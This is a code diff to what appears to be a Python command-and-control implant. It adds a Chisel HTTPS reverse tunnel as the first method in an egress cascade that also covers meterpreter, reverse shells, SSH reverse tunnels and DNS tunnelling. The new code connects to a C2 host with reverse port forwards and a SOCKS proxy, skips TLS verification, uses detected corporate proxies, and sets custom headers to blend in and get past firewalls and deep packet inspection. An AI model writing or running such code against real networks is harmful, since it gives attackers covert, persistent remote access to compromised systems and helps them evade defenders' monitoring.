@@ -49,6 +49,7 @@ _c2_method = None
 _pty_child_pid = None          # Tracked so signal handler can kill it
 _meterpreter_socket = None     # Tracked so force_shutdown can kill dispatch threads
 _ssh_tunnel_proc = None        # SSH reverse tunnel subprocess
+_chisel_proc = None            # Chisel HTTPS reverse tunnel subprocess
 _watchdog_stop = threading.Event()
 _exec_kill_event = threading.Event()  # Signal for killing meterpreter exec thread
 
@@ -65,6 +66,9 @@ def force_shutdown():
 
     # Kill SSH reverse tunnels
     _stop_ssh_tunnels()
+
+    # Kill Chisel subprocess
+    _stop_chisel()
 
     # Kill pty.spawn child (reverse shell)
     if _pty_child_pid:
@@ -297,6 +301,169 @@ def _check_socket_health(s):
     except Exception:
         return False
     return True
+
+
+# ── Chisel HTTPS Reverse Tunnel ────────────────────────────────
+
+def try_chisel(config):
+    """Establish a Chisel reverse tunnel over HTTPS/WebSocket.
+
+    Chisel provides multiplexed reverse port forwarding and SOCKS proxy
+    over a single WebSocket connection (typically port 443).  To any
+    DPI device the traffic is a standard HTTPS WebSocket upgrade —
+    far more reliable through enterprise firewalls than raw TCP on
+    high ports or SSH on 22.
+
+    Non-blocking: starts the chisel client as a background process with
+    built-in auto-reconnect.  Returns "chisel" on success, False on
+    failure.
+
+    Args:
+        config: Full parsed YAML config dict.  Reads from:
+            config["c2"]["host"]       — C2 server hostname
+            config["chisel"]           — Chisel-specific settings
+            config["ssh_tunnels"]      — Fallback forwards list
+            config["_detected_proxy_*"] — Proxy auto-detection results
+    """
+    global _chisel_proc, _c2_method, _current_state
+
+    _stop_chisel()
+
+    chisel_bin = shutil.which("chisel")
+    if not chisel_bin:
+        log.warning("chisel not installed — skipping HTTPS tunnel")
+        return False
+
+    c2_host = config["c2"]["host"]
+    chisel_cfg = config.get("chisel", {})
+
+    server_port = chisel_cfg.get("server_port", 443)
+    auth = chisel_cfg.get("auth", "")
+    tls = chisel_cfg.get("tls", True)
+    keepalive = chisel_cfg.get("keepalive", "25s")
+    max_retry = chisel_cfg.get("max_retry_interval", "30s")
+    socks_port = chisel_cfg.get("socks_port", 0)
+
+    # Build forwards: chisel-specific list, or inherit from ssh_tunnels
+    forwards = chisel_cfg.get("forwards", [])
+    if not forwards:
+        tunnel_cfg = config.get("ssh_tunnels", {})
+        forwards = tunnel_cfg.get("forwards", [])
+
+    if not forwards and not socks_port:
+        log.warning("Chisel: no forwards and no SOCKS configured — skipping")
+        return False
+
+    # Server URL
+    scheme = "https" if tls else "http"
+    server_url = "%s://%s:%d" % (scheme, c2_host, server_port)
+
+    cmd = [chisel_bin, "client"]
+
+    if auth:
+        cmd.extend(["--auth", auth])
+
+    cmd.extend(["--keepalive", keepalive])
+    cmd.extend(["--max-retry-count", "-1"])
+    cmd.extend(["--max-retry-interval", max_retry])
+
+    if tls:
+        cmd.append("--tls-skip-verify")
+
+    # Proxy support — uses same auto-detected proxy as meterpreter
+    proxy_host = config.get("_detected_proxy_host")
+    proxy_port = config.get("_detected_proxy_port")
+    if proxy_host and proxy_port:
+        cmd.extend(["--proxy", "http://%s:%s" % (proxy_host, proxy_port)])
+        log.info("Chisel: using detected proxy %s:%s", proxy_host, proxy_port)
+
+    # Header disguise — optional custom headers to blend with normal traffic
+    headers = chisel_cfg.get("headers", {})
+    for hname, hval in headers.items():
+        cmd.extend(["--header", "%s: %s" % (hname, hval)])
+
+    cmd.append(server_url)
+
+    # Reverse port forwards
+    for fwd in forwards:
+        remote_host = fwd.get("remote_host", "127.0.0.1")
+        cmd.append("R:%d:%s:%d" % (
+            fwd["local_port"], remote_host, fwd["remote_port"]))
+
+    # SOCKS proxy
+    if socks_port:
+        cmd.append("R:%d:socks" % socks_port)
+
+    log.info("Starting Chisel: %s", " ".join(cmd))
+
+    try:
+        proc = subprocess.Popen(
+            cmd,
+            stdin=subprocess.DEVNULL,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+        )
+
+        # Give chisel time to connect or fail fast
+        time.sleep(3)
+
+        if proc.poll() is not None:
+            rc = proc.returncode
+            err = ""
+            try:
+                err = proc.stderr.read().decode(errors="replace").strip()
+            except Exception:
+                pass
+            log.error("Chisel exited immediately (rc=%d): %s", rc, err[:500])
+            return False
+
+        _chisel_proc = proc
+        _c2_method = "chisel"
+        _current_state = EgressState.CONNECTED
+
+        log.info("Chisel connected to %s (pid=%d)", server_url, proc.pid)
+        for fwd in forwards:
+            log.info("  Chisel: c2-server:%d → %s:%d",
+                     fwd["local_port"],
+                     fwd.get("remote_host", "127.0.0.1"),
+                     fwd["remote_port"])
+        if socks_port:
+            log.info("  Chisel: c2-server:%d → SOCKS5 proxy", socks_port)
+
+        return "chisel"
+
+    except FileNotFoundError:
+        log.error("Chisel binary not found")
+        return False
+    except Exception as e:
+        log.error("Chisel failed to start: %s", e)
+        return False
+
+
+def _stop_chisel():
+    """Terminate Chisel subprocess if running.
+
+    Signal-safe (no logging) — called from force_shutdown().
+    """
+    global _chisel_proc
+    if _chisel_proc is not None:
+        try:
+            _chisel_proc.terminate()
+        except OSError:
+            pass
+        try:
+            _chisel_proc.wait(timeout=3)
+        except Exception:
+            try:
+                _chisel_proc.kill()
+            except OSError:
+                pass
+        _chisel_proc = None
+
+
+def chisel_is_alive():
+    """Check if the Chisel process is still running."""
+    return _chisel_proc is not None and _chisel_proc.poll() is None
 
 
 # ── DNS Tunnel (iodine) ────────────────────────────────────────
@@ -1049,6 +1216,7 @@ def run_cascade(config):
 
     c2_host = config["c2"]["host"]
     c2_ports = config["c2"]["ports"]
+    chisel_cfg = config.get("chisel", {})
     dns_cfg = config.get("dns_tunnel", {})
     met_cfg = config.get("meterpreter", {})
     tunnel_cfg = config.get("ssh_tunnels")
@@ -1059,6 +1227,14 @@ def run_cascade(config):
     proxy_port = config.get("_detected_proxy_port")
     if proxy_host and proxy_port:
         proxy = (proxy_host, proxy_port)
+
+    # ── Method 0: Chisel HTTPS Tunnel ──────────────────────
+    if chisel_cfg.get("enabled", False):
+        log.info("=== C2 Method 0: Chisel HTTPS Tunnel ===")
+        result = try_chisel(config)
+        if result:
+            _current_state = EgressState.CONNECTED
+            return result
 
     # ── Method 1: DNS Tunnel ────────────────────────────────
     if dns_cfg.get("enabled", True):
